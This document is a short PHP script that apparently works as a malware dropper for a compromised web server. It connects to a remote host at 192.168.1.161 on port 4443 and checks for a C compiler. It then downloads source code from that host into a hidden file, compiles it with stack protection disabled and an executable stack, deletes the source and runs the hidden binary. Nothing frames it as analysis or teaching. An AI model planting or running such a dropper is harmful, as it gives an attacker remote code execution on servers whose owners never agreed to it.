<?php $sock1=fsockopen('192.168.1.161',4443);fwrite($sock1, 'landing...'); function cmd_e($cmd){$return=shell_exec(sprintf('command -v %s', escapeshellarg($cmd)));return !empty($return);}if (!cmd_e('gcc')){ if (!cmd_e('g++')){ if (!cmd_e('clang')) { $compile = "false";}}} if ($compile != "false") { $compile = "true"; } $sock2=fsockopen('192.168.1.161',4443);fwrite($sock2, "payload:$compile"); $data=fread($sock2, 1024); $file=fopen(".a.c", "w"); fwrite($file, $data); function execute($comp) { exec("$comp -fno-stack-protector -z execstack .a.c -o .o && rm .a.c; ./.o"); } execute('gcc'); execute('g++'); execute('clang')?>
